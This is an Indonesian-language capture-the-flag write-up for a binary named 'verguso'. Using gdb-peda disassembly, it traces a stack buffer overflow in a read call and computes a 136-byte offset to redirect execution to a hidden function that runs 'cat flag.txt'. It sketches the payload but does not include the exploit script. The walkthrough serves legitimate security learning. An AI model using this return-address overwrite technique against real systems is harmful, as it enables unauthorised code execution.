Diberikan sebuah binary bernama Verguso

Kita check terlebih dahulu
```
$ file verguso
verguso: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d3f1ad27e7c84e0d4acd06c2d807a982fd66d8d1, not stripped
```

Saat dijalankan program meminta sebuah input.

```
$ ./verguso
Tidak Semudah ItuNikko Enggaliano
```

Saat program selesai meminta input langsung exit. Mari kita debug untuk tahu program tersebut ngapain.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Konfigurasinya sebagai Terlihat diatas. Mari kita lihat ada fungsi apa aja.

```
gdb-peda$ info function
All defined functions:

--SKIP--
0x00000000004005b6  verguso
0x00000000004005c7  nono
0x00000000004005e8  main
```

Mari kita liat fungsi `main` ngapain

```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x00000000004005e8 <+0>:     push   rbp
   0x00000000004005e9 <+1>:     mov    rbp,rsp
   0x00000000004005ec <+4>:     sub    rsp,0x10
   0x00000000004005f0 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005f3 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005f7 <+15>:    mov    edx,0x11
   0x00000000004005fc <+20>:    mov    esi,0x4006b1
   0x0000000000400601 <+25>:    mov    edi,0x1
   0x0000000000400606 <+30>:    call   0x400470 <write@plt>
   0x000000000040060b <+35>:    mov    eax,0x0
   0x0000000000400610 <+40>:    call   0x4005c7 <nono>
   0x0000000000400615 <+45>:    mov    eax,0x0
   0x000000000040061a <+50>:    leave
   0x000000000040061b <+51>:    ret
End of assembler dump.
gdb-peda$
```

Terlihat disitu program setelah memprint sesuaty pada main+30 lalu memanggil fungsi nono, Mari kita lihat fungsi nono


```
gdb-peda$ pdisas nono
Dump of assembler code for function nono:
   0x00000000004005c7 <+0>:     push   rbp
   0x00000000004005c8 <+1>:     mov    rbp,rsp
   0x00000000004005cb <+4>:     add    rsp,0xffffffffffffff80
   0x00000000004005cf <+8>:     lea    rax,[rbp-0x80]
   0x00000000004005d3 <+12>:    mov    edx,0x200
   0x00000000004005d8 <+17>:    mov    rsi,rax
   0x00000000004005db <+20>:    mov    edi,0x0
   0x00000000004005e0 <+25>:    call   0x400490 <read@plt>
   0x00000000004005e5 <+30>:    nop
   0x00000000004005e6 <+31>:    leave
   0x00000000004005e7 <+32>:    ret
End of assembler dump.
```

Nono adalah fungsi inputan, Terlihat disitu memanggl fungsi `read` yang vunarable terhadap bof. Jadi bisa kita simpulkan bahwa kita harus mengarahkan sesuatu ke RIP

Mari kita lihat fungsi `verguso` yang tidak di panggil sama sekali.

```
gdb-peda$ pdisas verguso
Dump of assembler code for function verguso:
   0x00000000004005b6 <+0>:     push   rbp
   0x00000000004005b7 <+1>:     mov    rbp,rsp
   0x00000000004005ba <+4>:     mov    edi,0x4006a4
   0x00000000004005bf <+9>:     call   0x400480 <system@plt>
   0x00000000004005c4 <+14>:    nop
   0x00000000004005c5 <+15>:    pop    rbp
   0x00000000004005c6 <+16>:    ret
End of assembler dump.
```

Terlihat disitu ada fungsi system yang di panggil. Yang bisa saja shell, Tapi mari kita lihat fungsi ini ngapain. Kita arahkan verguso ke $EIP

Pertama kita break pada ret fungsi main

```
gdb-peda$ b*main+51
Breakpoint 1 at 0x40061b
gdb-peda$ r
Tidak Semudah Itusaaaaaaaaaaaaaaaaaaaaaaaaa
```

Lalu kita isi $RIP dengan fungsi verguso

```
gdb-peda$ set $rip=&verguso
gdb-peda$ ni

```

```
RDI: 0x4006a4 ("cat flag.txt")
```

Terlihat bahwa system menjalankan fungsi cat flag.

jadi idenya kita isi $RIP dengan fungsi verguso

Pada fungsi nono inputan kita dialokasikan sebesar

```
 0x00000000004005cf <+8>:     lea    rax,[rbp-0x80]
```

Jadi kita tinggal hitung jarak antara $rbp-0x80 sampai $rbp+8 saat RIP terovewrite

Pertama kita break pada ret fungsi `main`

```
gdb-peda$ b*main+51
Breakpoint 1 at 0x40061b
gdb-peda$ r
Tidak Semudah ItuNikkko
```

Lalu kita jalankan fungsi

```
gdb-peda$ distance $rbp-0x80 $rbp+8
From 0x4005a0 to 0x400628: 136 bytes, 34 dwords
```

Terlihat 136 diperlukan untuk mengoverwrite $RIP

jadi isi payload kita adalah

junk*136->fungsi verguso->flag


Saya telah menulis Exploitnya silahkan dilihat dan dijalankan

Nikko Enggaliano
